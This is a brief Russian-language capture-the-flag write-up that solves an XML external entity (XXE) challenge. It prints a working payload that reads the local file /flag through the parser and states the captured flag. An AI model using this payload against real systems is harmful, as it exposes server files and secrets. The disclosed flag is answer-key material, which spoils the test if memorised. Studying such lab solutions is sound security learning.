# Решение

## Идея
XML парсер разрешает внешние сущности. Можно подключить сущность к локальному файлу и вывести его содержимое.

## Эксплуатация
Отправить XML с внешней сущностью, указывающей на `/flag`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<user><username>&xxe;</username></user>
```

В ответе вернется содержимое файла `/flag`.

## Флаг
`FECTF{xxe_injection_works_here}`
